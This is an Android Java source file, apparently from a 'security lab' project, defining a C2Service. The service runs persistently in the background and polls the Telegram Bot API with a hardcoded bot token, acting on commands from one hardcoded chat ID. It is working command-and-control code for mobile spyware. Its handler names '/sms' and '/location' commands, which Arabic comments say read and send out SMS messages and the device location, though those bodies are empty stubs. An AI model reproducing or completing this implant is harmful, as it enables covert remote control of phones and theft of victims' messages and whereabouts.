package com.example.securitylab;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class C2Service extends Service {
    private static final String BOT_TOKEN = "8731217847:AAH1ZwNQ28L2Ze8Uzudc3Vq13L0Ii_UeDQQ";
    private static final long ALLOWED_CHAT_ID = 7399463177L;
    private boolean isRunning = true;
    private long lastUpdateId = 0;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                while (isRunning) {
                    try {
                        pollTelegramCommands();
                        Thread.sleep(5000);
                    } catch (Exception e) {
                        Log.e("C2Service", "Error polling: " + e.getMessage());
                    }
                }
            }
        }).start();
        return START_STICKY;
    }

    private void pollTelegramCommands() {
        try {
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1);
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");

            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();

            JSONObject jsonResponse = new JSONObject(response.toString());
            if (jsonResponse.getBoolean("ok")) {
                JSONArray results = jsonResponse.getJSONArray("result");
                for (int i = 0; i < results.length(); i++) {
                    JSONObject update = results.getJSONObject(i);
                    lastUpdateId = update.getLong("update_id");
                    
                    if (update.has("message")) {
                        JSONObject message = update.getJSONObject("message");
                        String text = message.optString("text", "");
                        long chatId = message.getJSONObject("chat").getLong("id");

                        // التحقق من أن الأوامر تُنفذ فقط من خلال الشات المسموح به
                        if (chatId == ALLOWED_CHAT_ID) {
                            handleCommand(text, chatId);
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e("Polling", "Exception: " + e.getMessage());
        }
    }

    private void handleCommand(String command, long chatId) {
        if (command.equals("/sms")) {
            // تنفيذ قراءة رسائل SMS وإرسالها
        } else if (command.equals("/location")) {
            // استخراج الموقع الجغرافي وإرساله
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isRunning = false;
    }
}